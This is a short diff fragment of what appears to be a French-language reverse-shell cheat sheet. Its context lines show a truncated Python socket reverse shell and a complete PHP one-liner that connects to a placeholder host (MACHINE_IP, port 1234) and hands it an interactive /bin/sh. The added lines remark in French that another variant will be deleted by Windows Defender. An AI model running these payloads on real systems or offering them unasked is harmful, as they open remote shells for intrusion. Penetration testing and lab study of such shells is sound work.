@@ -57,6 +57,10 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 php -r '$sock=fsockopen("MACHINE_IP",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
+ou 
+
+celui ci, mais windows defender le supprimera
+
 ### Ruby
 
 ```ruby
